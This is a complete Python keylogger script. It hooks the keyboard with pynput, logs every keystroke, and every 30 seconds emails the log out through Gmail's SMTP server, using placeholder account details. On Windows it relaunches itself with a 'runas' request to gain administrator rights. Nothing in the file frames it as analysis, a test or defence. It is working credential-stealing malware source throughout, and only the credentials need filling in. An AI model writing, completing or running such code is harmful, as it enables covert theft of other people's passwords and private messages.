import sys
import ctypes
import os
import time

try:
    import smtplib
    import threading
    from pynput import keyboard


    EMAIL_ADDRESS = "email"
    EMAIL_PASSWORD = "password"
    REPORT_INTERVAL = 30


    class Keylogger:
        def __init__(self, time_interval, email, password):
            self.log = "Keylogger Started..."
            self.interval = time_interval
            self.email = email
            self.password = password

        def append_to_log(self, string):
            self.log = self.log + string

        def on_press(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = " "
                elif key == key.enter:
                    current_key = " [ENTER] "
                else:
                    current_key = " " + str(key) + " "
            self.append_to_log(current_key)

        def send_mail(self, message):
            try:
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, message)
                server.quit()
                print("[+] Email sent successfully!")
            except Exception as e:
                print(f"[-] Error sending email: {e}")

        def report(self):
            if self.log:
                self.send_mail(self.log)
                self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def start(self):
            self.report()
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()


    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False


    if __name__ == "__main__":
        if is_admin():
            print(f"--- ADMIN MODE ACTIVE ---")
            print(f"[+] Python Executable: {sys.executable}")
            print(f"[+] Sending to: {EMAIL_ADDRESS}")
            print("[*] Waiting for keystrokes... (Don't close this window)")

            my_keylogger = Keylogger(REPORT_INTERVAL, EMAIL_ADDRESS, EMAIL_PASSWORD)
            my_keylogger.start()
        else:
            print("[-] Standard User detected. Requesting Admin...")

            # FIX: We wrap the script path in quotes to handle spaces in your username
            script_path = os.path.abspath(sys.argv[0])
            params = f'"{script_path}"'

            # 'runas' restarts the script with Admin rights using the quoted path
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

except Exception as e:
    print("\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print("CRITICAL ERROR CAUGHT:")
    print(e)
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
    input("Press Enter to close this window...")  # This keeps the window open!